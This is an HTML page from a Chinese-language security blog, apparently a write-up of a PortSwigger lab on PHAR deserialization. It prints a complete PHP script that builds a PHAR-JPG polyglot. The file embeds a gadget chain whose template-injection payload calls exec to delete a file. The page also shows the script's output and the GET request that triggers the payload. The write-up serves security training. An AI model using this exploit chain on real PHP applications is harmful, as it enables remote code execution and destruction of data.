@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="PortSwigger - Using PHAR deserialization to deploy a custom gadget chain">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger - 使用 PHAR 反序列化來部署自定義小工具">
+<meta property="og:url" content="https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/index.html">
+<meta property="og:site_name" content="r4ulux blog">
+<meta property="og:description" content="PortSwigger - Using PHAR deserialization to deploy a custom gadget chain">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/phar.png">
+<meta property="article:published_time" content="2025-02-09T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-27T10:12:12.048Z">
+<meta property="article:author" content="r4ulux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/phar.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PortSwigger - 使用 PHAR 反序列化來部署自定義小工具</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/07/05-psw-java-deserialization/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&text=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&is_video=false&description=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具&body=Check out this article: https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&name=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&t=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#phar-jpg-polyglot-php"><span class="toc-number">1.</span> <span class="toc-text">phar_jpg_polyglot.php</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B7%A8%E8%BC%AF-phar-jpg-polyglot-php-%E6%96%87%E4%BB%B6%E4%B8%A6%E9%81%8B%E8%A1%8C%E5%AE%83-%E4%BB%A5%E5%89%B5%E5%BB%BA%E5%8C%85%E5%90%AB-PHAR-%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">編輯 phar_jpg_polyglot.php 文件並運行它, 以創建包含 PHAR 的文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BC%E9%80%81%E4%B8%80%E5%80%8B-GET-%E8%AB%8B%E6%B1%82-cgi-bin-avatar-php-%E5%B8%B6%E6%9C%89%E5%8F%83%E6%95%B8-avatar-%E5%92%8C%E5%80%BC-phar-wiener-%E5%BE%9E%E8%80%8C%E8%A7%B8%E7%99%BC%E9%81%A0%E7%AB%AF%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%9C%89%E6%95%88%E8%B2%A0%E8%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">發送一個 GET 請求 &#x2F;cgi-bin&#x2F;avatar.php , 帶有參數 avatar 和值 phar:&#x2F;&#x2F;wiener , 從而觸發遠端程式碼執行有效負載</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PortSwigger - 使用 PHAR 反序列化來部署自定義小工具
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">r4ulux</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-09T00:00:00.000Z" class="dt-published" itemprop="datePublished">2025-02-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Insecure deserialization Expert Lab</p>
+<p>請分析 &#x2F;cgi-bin&#x2F; 內的代碼 CustomTemplate.php、Blog.php、avatar.php</p>
+<p>來源:<br><a target="_blank" rel="noopener" href="https://github.com/kunte0/phar-jpg-polyglot">Phar JPG Polyglot</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">📁 /phar-jpg-polyglot</span><br><span class="line">└── 📄 LICENSE</span><br><span class="line">└── 📄 README.md</span><br><span class="line">└── 📄 in.jpg</span><br><span class="line">└── 📄 out.jpg</span><br><span class="line">└── 📄 phar_jpg_polyglot.php</span><br><span class="line">└── 📄 php.ini</span><br><span class="line">└── 📄 test_phar_inject.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="phar-jpg-polyglot-php"><a href="#phar-jpg-polyglot-php" class="headerlink" title="phar_jpg_polyglot.php"></a>phar_jpg_polyglot.php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Fix PHP 8.2 warnings by explicitly defining class properties</span><br><span class="line">class Blog &#123;</span><br><span class="line">    public string $user;</span><br><span class="line">    public string $desc;</span><br><span class="line"></span><br><span class="line">    public function __construct(string $user, string $desc) &#123;</span><br><span class="line">        $this-&gt;user = $user;</span><br><span class="line">        $this-&gt;desc = $desc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CustomTemplate &#123;</span><br><span class="line">    public Blog $template_file_path;</span><br><span class="line"></span><br><span class="line">    public function __construct(Blog $blog) &#123;</span><br><span class="line">        $this-&gt;template_file_path = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate base PHAR file</span><br><span class="line">function generate_base_phar($obj, $prefix) &#123;</span><br><span class="line">    global $tempname;</span><br><span class="line">    @unlink($tempname);</span><br><span class="line">    </span><br><span class="line">    $phar = new Phar($tempname);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">    $phar-&gt;setStub(&quot;$prefix&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    $basecontent = file_get_contents($tempname);</span><br><span class="line">    @unlink($tempname);</span><br><span class="line">    return $basecontent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate PHAR-JPG polyglot payload</span><br><span class="line">function generate_polyglot($phar, $jpeg) &#123;</span><br><span class="line">    $phar = substr($phar, 6); // Remove `&lt;?php`</span><br><span class="line">    $len = strlen($phar) + 2;</span><br><span class="line">    $new = substr($jpeg, 0, 2) . &quot;\xff\xfe&quot; . chr(($len &gt;&gt; 8) &amp; 0xff) . chr($len &amp; 0xff) . $phar . substr($jpeg, 2);</span><br><span class="line"></span><br><span class="line">    // Calculate tar checksum</span><br><span class="line">    $contents = substr($new, 0, 148) . &quot;        &quot; . substr($new, 156);</span><br><span class="line">    $chksum = 0;</span><br><span class="line">    for ($i = 0; $i &lt; 512; $i++) &#123;</span><br><span class="line">        $chksum += ord(substr($contents, $i, 1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Embed checksum</span><br><span class="line">    $oct = sprintf(&quot;%07o&quot;, $chksum);</span><br><span class="line">    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);</span><br><span class="line">    return $contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Create serialization exploit object</span><br><span class="line">$blog = new Blog(</span><br><span class="line">    &#x27;any_user_you_want&#x27;,</span><br><span class="line">    &#x27;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;rm /home/carlos/morale.txt&quot;)&#125;&#125;&#x27;</span><br><span class="line">);</span><br><span class="line">$object = new CustomTemplate($blog);</span><br><span class="line"></span><br><span class="line">// Configure JPG payload</span><br><span class="line">$tempname = &#x27;temp.tar.phar&#x27;;</span><br><span class="line">$jpeg = file_get_contents(&#x27;in.jpg&#x27;);</span><br><span class="line">$outfile = &#x27;out.jpg&#x27;;</span><br><span class="line">$prefix = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">// Output serialized data (for manual testing)</span><br><span class="line">echo &quot;Serialized Data:\n&quot;;</span><br><span class="line">var_dump(serialize($object));</span><br><span class="line"></span><br><span class="line">// Generate Polyglot payload and save it as `out.jpg`</span><br><span class="line">file_put_contents($outfile, generate_polyglot(generate_base_phar($object, $prefix), $jpeg));</span><br><span class="line"></span><br><span class="line">echo &quot;\n Payload Successfully Generated: &#123;$outfile&#125;\n&quot;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> Alternative: Generate GIF payload (if the target allows GIF uploads)</span><br><span class="line">$prefix = &quot;\x47\x49\x46\x38\x39\x61&quot; . &quot;\x2c\x01\x2c\x01&quot;; // GIF header</span><br><span class="line">$tempname = &#x27;temp.phar&#x27;;</span><br><span class="line">$outfile = &#x27;out.gif&#x27;;</span><br><span class="line">file_put_contents($outfile, generate_base_phar($object, $prefix));</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="編輯-phar-jpg-polyglot-php-文件並運行它-以創建包含-PHAR-的文件"><a href="#編輯-phar-jpg-polyglot-php-文件並運行它-以創建包含-PHAR-的文件" class="headerlink" title="編輯 phar_jpg_polyglot.php 文件並運行它, 以創建包含 PHAR 的文件"></a>編輯 phar_jpg_polyglot.php 文件並運行它, 以創建包含 PHAR 的文件</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ php -c php.ini phar_jpg_polyglot.php </span><br><span class="line">Serialized Data:</span><br><span class="line">string(229) &quot;O:14:&quot;CustomTemplate&quot;:1:&#123;s:18:&quot;template_file_path&quot;;O:4:&quot;Blog&quot;:2:&#123;s:4:&quot;user&quot;;s:17:&quot;any_user_you_want&quot;;s:4:&quot;desc&quot;;s:106:&quot;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;rm /home/carlos/morale.txt&quot;)&#125;&#125;&quot;;&#125;&#125;&quot;</span><br><span class="line"></span><br><span class="line"> Payload Successfully Generated: out.jpg</span><br></pre></td></tr></table></figure>
+
+<h5 id="發送一個-GET-請求-cgi-bin-avatar-php-帶有參數-avatar-和值-phar-wiener-從而觸發遠端程式碼執行有效負載"><a href="#發送一個-GET-請求-cgi-bin-avatar-php-帶有參數-avatar-和值-phar-wiener-從而觸發遠端程式碼執行有效負載" class="headerlink" title="發送一個 GET 請求 &#x2F;cgi-bin&#x2F;avatar.php , 帶有參數 avatar 和值 phar:&#x2F;&#x2F;wiener , 從而觸發遠端程式碼執行有效負載"></a>發送一個 GET 請求 &#x2F;cgi-bin&#x2F;avatar.php , 帶有參數 avatar 和值 phar:&#x2F;&#x2F;wiener , 從而觸發遠端程式碼執行有效負載</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/avatar.php?avatar=phar://wiener HTTP/2</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/02/09/06-psw-phar-deserialization/phar.png" alt="PHAR"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Articles</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#phar-jpg-polyglot-php"><span class="toc-number">1.</span> <span class="toc-text">phar_jpg_polyglot.php</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B7%A8%E8%BC%AF-phar-jpg-polyglot-php-%E6%96%87%E4%BB%B6%E4%B8%A6%E9%81%8B%E8%A1%8C%E5%AE%83-%E4%BB%A5%E5%89%B5%E5%BB%BA%E5%8C%85%E5%90%AB-PHAR-%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">編輯 phar_jpg_polyglot.php 文件並運行它, 以創建包含 PHAR 的文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BC%E9%80%81%E4%B8%80%E5%80%8B-GET-%E8%AB%8B%E6%B1%82-cgi-bin-avatar-php-%E5%B8%B6%E6%9C%89%E5%8F%83%E6%95%B8-avatar-%E5%92%8C%E5%80%BC-phar-wiener-%E5%BE%9E%E8%80%8C%E8%A7%B8%E7%99%BC%E9%81%A0%E7%AB%AF%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%9C%89%E6%95%88%E8%B2%A0%E8%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">發送一個 GET 請求 &#x2F;cgi-bin&#x2F;avatar.php , 帶有參數 avatar 和值 phar:&#x2F;&#x2F;wiener , 從而觸發遠端程式碼執行有效負載</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&text=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&is_video=false&description=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具&body=Check out this article: https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&title=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&name=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.r4ulux.cc/2025/02/09/06-psw-phar-deserialization/&t=PortSwigger - 使用 PHAR 反序列化來部署自定義小工具"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    r4ulux
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
